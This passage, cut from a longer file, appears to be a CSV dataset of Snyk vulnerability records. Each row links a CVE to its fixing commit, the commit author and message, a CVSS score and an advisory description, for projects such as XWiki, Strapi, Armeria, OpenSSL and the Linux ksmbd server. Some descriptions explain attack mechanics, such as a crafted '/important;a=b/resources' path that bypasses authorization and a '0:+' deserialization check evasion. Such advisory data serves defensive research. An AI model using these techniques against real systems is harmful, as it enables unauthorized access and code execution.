* Write the feed directly to the response.
* Use the source parameter of the code macro.
* Add page test.",Unknown,9.9,critical,Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'). Any user who can edit their own user profile and notification settings can execute arbitrary script macros including Groovy and Python macros that allow remote code execution including unrestricted read and write access to all wiki contents.,2023
CVE-2023-36471,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKICOMMONS-5747787,30/06/2023,30/06/2023,https://github.com/xwiki/xwiki-commons/commit/99484d48e899a68a1b6e33d457825b776c6fe8c3,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),https://api.github.com/repos/xwiki/xwiki-commons/commits/99484d48e899a68a1b6e33d457825b776c6fe8c3,Michael Hamann,michael.hamann@xwiki.com,xwiki-commons,99484d48e899a68a1b6e33d457825b776c6fe8c3,XCOMMONS-2634: Disallow form-related tags in HTML sanitizer,Java,9.0,critical,"Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') due to allowing an attacker without script right to either create forms that can be used for phishing attacks or also in the context of a sheet. The attacker can add a malicious input that would allow remote code execution when it is submitted by an admin (the sheet is rendered as part of the edit form). 
Note:
The attacker would need to ensure that the edit form looks plausible, though, which can be non-trivial as without script right the attacker cannot display the regular content of the document.",2023
CVE-2023-34235,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-STRAPIUTILS-5805289,26/07/2023,26/07/2023,https://github.com/strapi/strapi/commit/9f57ff7bff114295c1fb3bb1b3078714bd8ab198,Information Exposure,https://api.github.com/repos/strapi/strapi/commits/9f57ff7bff114295c1fb3bb1b3078714bd8ab198,Ben Irvin,ben@innerdvations.com,strapi,9f57ff7bff114295c1fb3bb1b3078714bd8ab198,"only allow attributes and operators on filters

Co-authored-by: Jean-Sébastien Herbaux <Convly@users.noreply.github.com>",JavaScript,8.6,high,"@strapi/utils is a Shared utilities for the Strapi packages
Affected versions of this package are vulnerable to Information Exposure such that it is possible to leak private fields if one is using the t(number) prefix. Knex query allows users to change the default prefix. For example, if someone changes the prefix to be the same as it was before or to another table they want to query, the query changes from password to t1.password. password is protected by filtering protections but t1.password is not protected. 
Note:
This can lead to filtering attacks on everything related to the object, including admin passwords and reset-tokens.",2023
CVE-2023-38493,CWE-863,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMLINECORPARMERIA-5805287,26/07/2023,26/07/2023,https://github.com/line/armeria/commit/49e04ef231ad65750739529c7fa4ce946ff7588b,Incorrect Authorization,https://api.github.com/repos/line/armeria/commits/49e04ef231ad65750739529c7fa4ce946ff7588b,minux,minu.song@linecorp.com,armeria,49e04ef231ad65750739529c7fa4ce946ff7588b,"Merge pull request from GHSA-wvp2-9ppw-337j

* Remove matrix variables from the path on the server-side
Motivation:
Spring supports [Matrix variables](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/matrix-variables.html).
When Spring integration is used, Armeria calls Spring controllers via `TomcatService` or `JettyService` with the path
that may contain matrix variables.
In this situation, the Armeria decorators might not invoked because of the matrix variables.
Let's see the following example:
```
// Spring controller
@GetMapping(""/important/resources"")
public String important() {...}

// Armeria decorator
ServerBuilder sb = ...
sb.decoratorUnder(""/important/"", authService);
```
If an attacker sends a request with `/important;a=b/resources`, the request would bypass the authrorizer
which is a significant security vulnerability.

Armeria neither supports it nor has any plans to support it. So we can just remove the matrix variables from the path and restore them when we call Spring controllers.

Modifications:
- Remove matrix varilbles from the server-side path.
  - The path is restored when calling Spring service using `RequestTarget.pathWithMatrixVariables()`.
- Do not decode `%3B` which is `;`.
- Add `it/boot3-jetty` module by Copying `it/boot3-tomcat`

Result:
- The decorators work correctly when the request path contains matrix varialbes.

* Update it/spring/boot3-jetty11/src/test/resources/application-testbed.yml",Java,7.5,high,"com.linecorp.armeria:armeria is an asynchronous HTTP/2 RPC/REST client/server library built on top of Java 8, Netty, Thrift and gRPC (armeria)
Affected versions of this package are vulnerable to Incorrect Authorization. When Spring integration is used, Armeria calls Spring controllers via TomcatService or JettyService with the path that may contain matrix variables. The Armeria decorators might not be invoked because of the matrix variables. If an attacker sends a specially crafted request, the request may bypass the authorizer.",2023
CVE-2023-37460,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGCODEHAUSPLEXUS-5805290,26/07/2023,26/07/2023,https://github.com/codehaus-plexus/plexus-archiver/commit/54759839fbdf85caf8442076f001d5fd64e0dcb2,Directory Traversal,https://api.github.com/repos/codehaus-plexus/plexus-archiver/commits/54759839fbdf85caf8442076f001d5fd64e0dcb2,uriyay-jfrog,uriyay@jfrog.com,plexus-archiver,54759839fbdf85caf8442076f001d5fd64e0dcb2,Avoid override target symlink by standard file in AbstractUnArchiver,Java,8.1,high,"Affected versions of this package are vulnerable to Directory Traversal which might lead to an arbitrary file creation and possibly remote code execution. 
When extracting an archive with an entry that already exists in the destination directory as a symbolic link whose target does not exist - the resolveFile() function will return the symlink's source instead of its target, which will pass the verification that ensures the file will not be extracted outside of the destination directory. Later Files.newOutputStream(), that follows symlinks by default,  will actually write the entry's content to the symlink's target.",2023
CVE-2023-34235,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-STRAPIDATABASE-5805288,26/07/2023,26/07/2023,https://github.com/strapi/strapi/commit/9f57ff7bff114295c1fb3bb1b3078714bd8ab198,Information Exposure,https://api.github.com/repos/strapi/strapi/commits/9f57ff7bff114295c1fb3bb1b3078714bd8ab198,Ben Irvin,ben@innerdvations.com,strapi,9f57ff7bff114295c1fb3bb1b3078714bd8ab198,"only allow attributes and operators on filters

Co-authored-by: Jean-Sébastien Herbaux <Convly@users.noreply.github.com>",JavaScript,8.6,high,"@strapi/database is a Strapi's database layer
Affected versions of this package are vulnerable to Information Exposure such that it is possible to leak private fields if one is using the t(number) prefix. Knex query allows users to change the default prefix. For example, if someone changes the prefix to be the same as it was before or to another table they want to query, the query changes from password to t1.password. password is protected by filtering protections but t1.password is not protected. 
Note:
This can lead to filtering attacks on everything related to the object, including admin passwords and reset-tokens.",2023
CVE-2023-34093,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-STRAPIUTILS-5805054,26/07/2023,25/07/2023,https://github.com/strapi/strapi/commit/2fa8f30371bfd1db44c15e5747860ee5789096de,Information Exposure,https://api.github.com/repos/strapi/strapi/commits/2fa8f30371bfd1db44c15e5747860ee5789096de,nathan-pichon,nathan.pichon@strapi.io,strapi,2fa8f30371bfd1db44c15e5747860ee5789096de,"fix(content-types): remove getter for private attributes

+ Fixes a flaky test (transactions.test.api.js)",JavaScript,4.2,medium,"@strapi/utils is a Shared utilities for the Strapi packages
Affected versions of this package are vulnerable to Information Exposure by developers, users, or plugins, all of who can make every attribute of a Content-Type public without knowing it. The privateAttributes getter is removed when content types are modified, which can result in any attribute becoming public.
NOTE: If a user mutates the content-type they will not be affected.",2023
CVE-2023-34093,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-STRAPISTRAPI-5805052,26/07/2023,25/07/2023,https://github.com/strapi/strapi/commit/2fa8f30371bfd1db44c15e5747860ee5789096de,Information Exposure,https://api.github.com/repos/strapi/strapi/commits/2fa8f30371bfd1db44c15e5747860ee5789096de,nathan-pichon,nathan.pichon@strapi.io,strapi,2fa8f30371bfd1db44c15e5747860ee5789096de,"fix(content-types): remove getter for private attributes

+ Fixes a flaky test (transactions.test.api.js)",JavaScript,4.2,medium,"@strapi/strapi is an updated version of the old 'strapi', which is a  free and open-source headless CMS delivering your content anywhere you need.
Affected versions of this package are vulnerable to Information Exposure by developers, users, or plugins, all of who can make every attribute of a Content-Type public without knowing it. The privateAttributes getter is removed when content types are modified, which can result in any attribute becoming public.
NOTE: If a user mutates the content-type they will not be affected.",2023
CVE-2023-34093,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-STRAPIDATABASE-5805053,26/07/2023,25/07/2023,https://github.com/strapi/strapi/commit/2fa8f30371bfd1db44c15e5747860ee5789096de,Information Exposure,https://api.github.com/repos/strapi/strapi/commits/2fa8f30371bfd1db44c15e5747860ee5789096de,nathan-pichon,nathan.pichon@strapi.io,strapi,2fa8f30371bfd1db44c15e5747860ee5789096de,"fix(content-types): remove getter for private attributes

+ Fixes a flaky test (transactions.test.api.js)",JavaScript,4.2,medium,"@strapi/database is a Strapi's database layer
Affected versions of this package are vulnerable to Information Exposure by developers, users, or plugins, all of who can make every attribute of a Content-Type public without knowing it. The privateAttributes getter is removed when content types are modified, which can result in any attribute becoming public.
NOTE: If a user mutates the content-type they will not be affected.",2023
CVE-2018-10657,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-MATRIXSYNAPSE-5805291,26/07/2023,14/05/2022,https://github.com/matrix-org/synapse/commit/33f469ba19586bbafa0cf2c7d7c35463bdab87eb,Denial of Service (DoS),https://api.github.com/repos/matrix-org/synapse/commits/33f469ba19586bbafa0cf2c7d7c35463bdab87eb,Richard van der Hoff,richard@matrix.org,synapse,33f469ba19586bbafa0cf2c7d7c35463bdab87eb,"Apply some limits to depth to counter abuse

* When creating a new event, cap its depth to 2^63 - 1
* When receiving events, reject any without a sensible depth

As per https://docs.google.com/document/d/1I3fi2S-XnpO45qrpCsowZv8P8dHcNZ4fsBsbOW7KABI",Python,7.5,high,"matrix-synapse is an ecosystem for open federated Instant Messaging and VoIP.
Affected versions of this package are vulnerable to Denial of Service (DoS) when malicious events injected with depth = 2^63 - 1 render rooms unusable, related to federation/federation_base.py and handlers/message.py.",2023
CVE-2023-37920,CWE-296,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-CERTIFI-5805047,25/07/2023,25/07/2023,https://github.com/certifi/python-certifi/commit/8fb96ed81f71e7097ed11bc4d9b19afd7ea5c909,Improper Following of a Certificate's Chain of Trust,https://api.github.com/repos/certifi/python-certifi/commits/8fb96ed81f71e7097ed11bc4d9b19afd7ea5c909,Cory Benfield,lukasaoz@gmail.com,python-certifi,8fb96ed81f71e7097ed11bc4d9b19afd7ea5c909,2023.07.22,Python,3.7,low,"Affected versions of this package are vulnerable to Improper Following of a Certificate's Chain of Trust. E-Tugra's root certificates are being removed pursuant to an investigation prompted by reporting of security issues in their systems. Conclusions of Mozilla's investigation can be found here.
Note:
This issue is not an inherent vulnerability in the package, but a security measure against potential harmful effects of trusting the now-revoked root certificates.",2023
CVE-2023-34478,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESHIRO-5804850,25/07/2023,25/07/2023,https://github.com/apache/shiro/commit/c3ede3f94efb442acb0795714a022c2c121d1da0,Directory Traversal,https://api.github.com/repos/apache/shiro/commits/c3ede3f94efb442acb0795714a022c2c121d1da0,Brian Demers,bdemers@apache.org,shiro,c3ede3f94efb442acb0795714a022c2c121d1da0,Adds improved path filter,Java,5.3,medium,"org.apache.shiro:shiro-web is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management.
Affected versions of this package are vulnerable to Directory Traversal when used together with APIs or other web frameworks that route non-normalized requests. An attacker can use this to access unintended locations on the target filesystem by sending malicious requests.",2023
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-RUST-S2NQUIC-5804032,25/07/2023,25/07/2023,https://github.com/aws/s2n-quic/commit/73a814240c5db6fae261a6e4ab567b0b094a35db,Denial of Service (DoS),https://api.github.com/repos/aws/s2n-quic/commits/73a814240c5db6fae261a6e4ab567b0b094a35db,Wesley Rosenblum,55108558+WesleyRosenblum@users.noreply.github.com,s2n-quic,73a814240c5db6fae261a6e4ab567b0b094a35db,"Merge pull request from GHSA-rfhg-rjfp-9q8q

* fix(s2n-quic-transport): close connection when no available connection ids

* allow all connection migrations when testing

* add generator to stateless reset token

* fix partial eq impl for connection IDs

* add new connection ID to fuzz test

* implement hash and fix merge issues

* Impl PartialOrd and Ord

* PR feedback

* clippy",Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS) due to a combination of peer-initiated connection migration and duplicate new connection ID frames being received. Exploiting this vulnerability results in the endpoint shutting down
Note:
No AWS services are affected by this issue, and customers of AWS services do not need to take action.",2023
CVE-2018-16629,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-INTELLIANTSSUBRION-5804002,25/07/2023,14/05/2022,https://github.com/intelliants/subrion/commit/fbc29ddb29e9c9732695e25ad2c22e038eed6385,Cross-site Scripting (XSS),https://api.github.com/repos/intelliants/subrion/commits/fbc29ddb29e9c9732695e25ad2c22e038eed6385,Daiyrbek Artelov,4unkur@mail.ru,subrion,fbc29ddb29e9c9732695e25ad2c22e038eed6385,Resolves #777,Unknown,4.8,medium,"intelliants/subrion is an open source php content management system.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the panel/uploads/#elf_l1_XA endpoint, which accepts malicious SVG files in a SCRIPT element.",2023
CVE-2023-3446,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-OPENSSL-5803998,25/07/2023,19/07/2023,https://github.com/openssl/openssl/commit/1fa20cf2f506113c761777127a38bce5068740eb,Denial of Service (DoS),https://api.github.com/repos/openssl/openssl/commits/1fa20cf2f506113c761777127a38bce5068740eb,Matt Caswell,matt@openssl.org,openssl,1fa20cf2f506113c761777127a38bce5068740eb,"Fix DH_check() excessive time with over sized modulus

The DH_check() function checks numerous aspects of the key or parameters
that have been supplied. Some of those checks use the supplied modulus
value even if it is excessively large.

There is already a maximum DH modulus size (10,000 bits) over which
OpenSSL will not generate or derive keys. DH_check() will however still
perform various tests for validity on such a large modulus. We introduce a
new maximum (32,768) over which DH_check() will just fail.

An application that calls DH_check() and supplies a key or parameters
obtained from an untrusted source could be vulnerable to a Denial of
Service attack.

The function DH_check() is itself called by a number of other OpenSSL
functions. An application calling any of those other functions may
similarly be affected. The other functions affected by this are
DH_check_ex() and EVP_PKEY_param_check().

CVE-2023-3446

Reviewed-by: Paul Dale <pauli@openssl.org>
Reviewed-by: Tom Cosgrove <tom.cosgrove@arm.com>
Reviewed-by: Bernd Edlinger <bernd.edlinger@hotmail.de>
Reviewed-by: Tomas Mraz <tomas@openssl.org>
(Merged from https://github.com/openssl/openssl/pull/21451)

(cherry picked from commit 9e0094e2aa1b3428a12d5095132f133c078d3c3d)",C/C++,5.3,medium,"Affected versions of this package are vulnerable to Denial of Service (DoS) in the DH_check(), DH_check_ex() and EVP_PKEY_param_check() functions, which are used to check a DH key or DH parameters.
When the key or parameters that are being checked contain an excessively large modulus value (the p parameter) this may cause slowness in processing. Some checks use the supplied modulus value even if it has already been found to be too large. 
The OpenSSL dhparam and pkeyparam command line applications are also vulnerable, when using the -check option. 
NOTE: The OpenSSL SSL/TLS implementation is not affected by this issue.",2023
CVE-2023-32258,CWE-362,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5808481,28/07/2023,28/07/2023,https://github.com/torvalds/linux/commit/abcc506a9a71976a8b4c9bf3ee6efd13229c1e19,Race Condition,https://api.github.com/repos/torvalds/linux/commits/abcc506a9a71976a8b4c9bf3ee6efd13229c1e19,Namjae Jeon,linkinjeon@kernel.org,linux,abcc506a9a71976a8b4c9bf3ee6efd13229c1e19,"ksmbd: fix racy issue from smb2 close and logoff with multichannel

When smb client send concurrent smb2 close and logoff request
with multichannel connection, It can cause racy issue. logoff request
free tcon and can cause UAF issues in smb2 close. When receiving logoff
request with multichannel, ksmbd should wait until all remaning requests
complete as well as ones in the current connection, and then make
session expired.

Cc: stable@vger.kernel.org
Reported-by: zdi-disclosures@trendmicro.com # ZDI-CAN-20796 ZDI-CAN-20595
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,8.1,high,"Affected versions of this package are vulnerable to Race Condition. A flaw was found in the Linux kernel's ksmbd, a high-performance in-kernel SMB server. The specific flaw exists within the processing of SMB2_LOGOFF and SMB2_CLOSE commands. The issue results from the lack of proper locking when performing operations on an object. An attacker can leverage this vulnerability to execute code in the context of the kernel.",2023
CVE-2023-37900,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCROSSPLANECROSSPLANEINTERNALCONTROLLERPKGREVISION-5808475,28/07/2023,28/07/2023,https://github.com/crossplane/crossplane/commit/ec47867d35baf6f4a88e1ea38efa6710b41fa727,Denial of Service (DoS),https://api.github.com/repos/crossplane/crossplane/commits/ec47867d35baf6f4a88e1ea38efa6710b41fa727,Philippe Scorsolini,p.scorsolini@gmail.com,crossplane,ec47867d35baf6f4a88e1ea38efa6710b41fa727,"fix: max size of package parsed limited to 200MB

Signed-off-by: Philippe Scorsolini <p.scorsolini@gmail.com>
(cherry picked from commit e44f73f2a73512671c5f6a25d4ad0ac193394657)",Go,3.4,low,"Affected versions of this package are vulnerable to Denial of Service (DoS). A high-privileged user can create a Package referencing an arbitrarily large image containing that Crossplane would then parse, possibly resulting in exhausting all the available memory and therefore in the container being OOMKilled. 
Note:
The impact is limited due to the high privileges required to be able to create the Package and the eventual consistency nature of the controller.",2023
CVE-2023-38491,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GETKIRBYCMS-5808476,28/07/2023,28/07/2023,https://github.com/getkirby/kirby/commit/2f06ba1c026bc91cb0702bc16b7d505642536d15,Cross-site Scripting (XSS),https://api.github.com/repos/getkirby/kirby/commits/2f06ba1c026bc91cb0702bc16b7d505642536d15,Lukas Bestle,lukas@getkirby.com,kirby,2f06ba1c026bc91cb0702bc16b7d505642536d15,"Fix MIME detection vulnerability

https://github.com/getkirby/kirby/security/advisories/GHSA-8fv7-wq38-f5c9",PHP,5.7,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the Kirby\Http\Response::file() method. An editor with write access to the Kirby Panel can upload a file with an unknown file extension like .xyz that contains HTML code including harmful content like <script> tags. The direct link to that file could be sent to other users or visitors of the site. If the victim opened that link in a browser where they are logged in to Kirby and the file had not been opened by anyone since the upload, Kirby would not be able to send the correct MIME content type, instead falling back to text/html. The browser would then run the script, which could for example trigger requests to Kirby's API with the permissions of the victim.
Note:
This issue affects all Kirby sites that might have potential attackers in the group of authenticated Panel users or that allow external visitors to upload an arbitrary file to the content folder. Kirby sites are not affected if they don't allow file uploads for untrusted users or visitors or if the file extensions of uploaded files are limited to a fixed safe list.
The attack requires user interaction by another user or visitor and cannot be automated.",2023
CVE-2023-32247,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-TORVALDSLINUX-5808480,28/07/2023,28/07/2023,https://github.com/torvalds/linux/commit/ea174a91893956450510945a0c5d1a10b5323656,Denial of Service (DoS),https://api.github.com/repos/torvalds/linux/commits/ea174a91893956450510945a0c5d1a10b5323656,Namjae Jeon,linkinjeon@kernel.org,linux,ea174a91893956450510945a0c5d1a10b5323656,"ksmbd: destroy expired sessions

client can indefinitely send smb2 session setup requests with
the SessionId set to 0, thus indefinitely spawning new sessions,
and causing indefinite memory usage. This patch limit to the number
of sessions using expired timeout and session state.

Cc: stable@vger.kernel.org
Reported-by: zdi-disclosures@trendmicro.com # ZDI-CAN-20478
Signed-off-by: Namjae Jeon <linkinjeon@kernel.org>
Signed-off-by: Steve French <stfrench@microsoft.com>",C/C++,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). A flaw was found in the Linux kernel's ksmbd, a high-performance in-kernel SMB server. The specific flaw exists within the handling of SMB2_SESSION_SETUP commands. The issue results from the lack of control of resource consumption. An attacker can leverage this vulnerability to create a denial-of-service condition on the system.
Note:
Authentication is not required to exploit this vulnerability, but only systems with ksmbd enabled are vulnerable.",2023
CVE-2023-38495,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCROSSPLANECROSSPLANEINTERNALCONTROLLERPKGREVISION-5808474,28/07/2023,28/07/2023,https://github.com/crossplane/crossplane/commit/d577b71940deb26e60d32ad03c0ba6339d3865e9,Improper Input Validation,https://api.github.com/repos/crossplane/crossplane/commits/d577b71940deb26e60d32ad03c0ba6339d3865e9,Philippe Scorsolini,p.scorsolini@gmail.com,crossplane,d577b71940deb26e60d32ad03c0ba6339d3865e9,"fix: validate Package images against manifest on pull

Signed-off-by: Philippe Scorsolini <p.scorsolini@gmail.com>
(cherry picked from commit 4feb58e7b6f8a30d1fc311f6169855465577e3f2)",Go,8.3,high,"Affected versions of this package are vulnerable to Improper Input Validation such that the image backend does not validate the byte contents of Crossplane packages. As such, Crossplane does not detect if an attacker has tampered with a Package.",2023
CVE-2018-20717,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PRESTASHOPPRESTASHOP-5808477,28/07/2023,14/05/2022,https://github.com/PrestaShop/PrestaShop/commit/468eb73e8441806cd7b4d3fb355ca123dcc49584,Arbitrary Code Injection,https://api.github.com/repos/PrestaShop/PrestaShop/commits/468eb73e8441806cd7b4d3fb355ca123dcc49584,Thomas LEVIANDIER,thomas.leviandier@gmail.com,PrestaShop,468eb73e8441806cd7b4d3fb355ca123dcc49584,replace serialize with json_encode,PHP,8.8,high,"prestashop/prestashop is an Open Source e-commerce platform, committed to providing the best shopping cart experience for both merchants and customers.
Affected versions of this package are vulnerable to Arbitrary Code Injection. An attack is possible after gaining access to a target store with a user role with the rights of at least a Salesman or higher privileges. The attacker can then inject arbitrary PHP objects into the process and abuse an object chain in order to gain Remote Code Execution. This occurs because protection against serialized objects looks for a 0: followed by an integer, but does not consider 0:+ followed by an integer.",2023
CVE-2023-38285,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-SPIDERLABSMODSECURITY-5808473,28/07/2023,26/07/2023,https://github.com/SpiderLabs/ModSecurity/commit/ab5658f2d4cfa5126db256cf3f9dcb299982366d,Denial of Service (DoS),https://api.github.com/repos/SpiderLabs/ModSecurity/commits/ab5658f2d4cfa5126db256cf3f9dcb299982366d,Martin Vierula,martin.vierula@trustwave.com,ModSecurity,ab5658f2d4cfa5126db256cf3f9dcb299982366d,Fix: worst-case time in implementation of four transformations,Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS) if a malicious user submits a specially crafted HTTP request via the removeWhitespace,removeNull,replaceNull  and removeCommentsChar transformations.",2023
CVE-2023-38509,CWE-402,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5808465,28/07/2023,28/07/2023,https://github.com/xwiki/xwiki-platform/commit/1dfb6804d4d412794cbe0098d4972b8ac263df0c,Transmission of Private Resources into a New Sphere ('Resource Leak'),https://api.github.com/repos/xwiki/xwiki-platform/commits/1dfb6804d4d412794cbe0098d4972b8ac263df0c,Manuel Leduc,manuel.leduc@xwiki.com,xwiki-platform,1dfb6804d4d412794cbe0098d4972b8ac263df0c,XWIKI-20601: Improved User Directory sorting,XML,4.3,medium,"Affected versions of this package are vulnerable to Transmission of Private Resources into a New Sphere ('Resource Leak') due to exposing sensitive information when sorting e-mail addresses. 
The mail obfuscation configuration was not fully taken into account and is was still possible by obfuscated emails.",2023
CVE-2017-8382,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ADMIDIOADMIDIO-5808464,28/07/2023,17/05/2022,https://github.com/Admidio/admidio/commit/9f4697fd024357a7a2232e250eb323cde62e62a5,Cross-site Request Forgery (CSRF),https://api.github.com/repos/Admidio/admidio/commits/9f4697fd024357a7a2232e250eb323cde62e62a5,Markus Faßbender,markus.fassbender@gmail.com,admidio,9f4697fd024357a7a2232e250eb323cde62e62a5,integrate ramsey/uuid,Markdown,4.5,medium,"admidio/admidio is a free open source user management system for websites of organizations and groups.
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) via the adm_program/modules/members/members_function.php component with the impact of deleting arbitrary user accounts.",2023
CVE-2017-0234,CWE-119,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACOREVC140-5808463,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3,Out-of-Bounds,https://api.github.com/repos/chakra-core/ChakraCore/commits/a1345ad48064921e8eb45fa0297ce405a7df14d3,Rajat Dua,radua@microsoft.com,ChakraCore,a1345ad48064921e8eb45fa0297ce405a7df14d3,"[CVE-2017-0234] Too aggressive bound check removal

Don't eliminate bounds checks on virtual typed arrays if we can't guarantee that the accesses will be within 4Gb",C/C++,7.5,high,"Microsoft.ChakraCore.vc140 is a core part of the Chakra JavaScript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Out-of-Bounds which can lead to remote code execution. This issue derives from the way JavaScript engines render when handling objects in memory.
Note:
This CVE ID is unique from CVE-2017-0224, CVE-2017-0228, CVE-2017-0229, CVE-2017-0230, CVE-2017-0235, CVE-2017-0236, and CVE-2017-0238.",2023
CVE-2017-0234,CWE-119,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACORE-5808462,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3,Out-of-Bounds,https://api.github.com/repos/chakra-core/ChakraCore/commits/a1345ad48064921e8eb45fa0297ce405a7df14d3,Rajat Dua,radua@microsoft.com,ChakraCore,a1345ad48064921e8eb45fa0297ce405a7df14d3,"[CVE-2017-0234] Too aggressive bound check removal

Don't eliminate bounds checks on virtual typed arrays if we can't guarantee that the accesses will be within 4Gb",C/C++,7.5,high,"Microsoft.ChakraCore is a core part of the Chakra Javascript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Out-of-Bounds which can lead to remote code execution. This issue derives from the way JavaScript engines render when handling objects in memory.
Note:
This CVE ID is unique from CVE-2017-0224, CVE-2017-0228, CVE-2017-0229, CVE-2017-0230, CVE-2017-0235, CVE-2017-0236, and CVE-2017-0238.",2023
CVE-2023-38492,CWE-770,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GETKIRBYCMS-5808466,28/07/2023,28/07/2023,https://github.com/getkirby/kirby/commit/0e10ce3b0c2b88656564b8ff518ddc99136ac43e,Allocation of Resources Without Limits or Throttling,https://api.github.com/repos/getkirby/kirby/commits/0e10ce3b0c2b88656564b8ff518ddc99136ac43e,Lukas Bestle,lukas@getkirby.com,kirby,0e10ce3b0c2b88656564b8ff518ddc99136ac43e,"Fix password length vulnerability

https://github.com/getkirby/kirby/security/advisories/GHSA-3v6j-v3qc-cxff",Config files,5.3,medium,"Affected versions of this package are vulnerable to Allocation of Resources Without Limits or Throttling. This allowed attackers to provide a password with a length up to the server's maximum request body length. Validating that password against the user's actual password requires hashing the provided password, which requires more CPU and memory resources (and therefore processing time) the longer the provided password gets. This could be abused by an attacker to cause the website to become unresponsive or unavailable.
Note:
This issue affects all Kirby sites with user accounts (unless Kirby's API and Panel are disabled in the config). Because Kirby comes with a built-in brute force protection, the impact of this vulnerability is limited to 10 failed logins from each IP address and 10 failed logins for each existing user per hour.",2023
CVE-2017-0208,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACOREVC140-5808458,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/54d6d085987e2c399863940179db67b594d7f0a3,Information Exposure,https://api.github.com/repos/chakra-core/ChakraCore/commits/54d6d085987e2c399863940179db67b594d7f0a3,Satheesh Ravindranath,saravind@microsoft.com,ChakraCore,54d6d085987e2c399863940179db67b594d7f0a3,"[CVE-2017-0208] Fix integer overflow in string.repeat

When using repeat API on javascript strings, we aren't checking for the upper cap of the length property.
Fix:
Instead of directly setting the length property in the constructor - We are now calling SetLength() - which also checks for the upper cap and throws OOM.
	       i",C/C++,4.3,medium,"Microsoft.ChakraCore.vc140 is a core part of the Chakra JavaScript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Information Exposure when the Chakra scripting engine does not properly handle objects in memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system.",2023
CVE-2017-0208,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACORE-5808457,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/54d6d085987e2c399863940179db67b594d7f0a3,Information Exposure,https://api.github.com/repos/chakra-core/ChakraCore/commits/54d6d085987e2c399863940179db67b594d7f0a3,Satheesh Ravindranath,saravind@microsoft.com,ChakraCore,54d6d085987e2c399863940179db67b594d7f0a3,"[CVE-2017-0208] Fix integer overflow in string.repeat

When using repeat API on javascript strings, we aren't checking for the upper cap of the length property.
Fix:
Instead of directly setting the length property in the constructor - We are now calling SetLength() - which also checks for the upper cap and throws OOM.
	       i",C/C++,4.3,medium,"Microsoft.ChakraCore is a core part of the Chakra Javascript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Information Exposure when the Chakra scripting engine does not properly handle objects in memory. An attacker who successfully exploited the vulnerability could obtain information to further compromise the user's system.",2023
CVE-2017-0236,CWE-119,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-MICROSOFTCHAKRACOREVC140-5808460,28/07/2023,17/05/2022,https://github.com/chakra-core/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031,Out-of-Bounds,https://api.github.com/repos/chakra-core/ChakraCore/commits/1ae7e3ce95515758b4cd7215cb4e48539a0f4031,Rajat Dua,radua@microsoft.com,ChakraCore,1ae7e3ce95515758b4cd7215cb4e48539a0f4031,"[CVE-2017-0236] Bug with array buffer detach

Change the vtable of virtual typed arrays to regular typed arrays upon array buffer detach to prevent writes to detached buffer in the jitted code.",C/C++,8.6,high,"Microsoft.ChakraCore.vc140 is a core part of the Chakra JavaScript engine that powers Microsoft Edge
Affected versions of this package are vulnerable to Out-of-Bounds which can lead to remote code execution. This issue derives from the way JavaScript engines render when handling objects in memory.
Note:
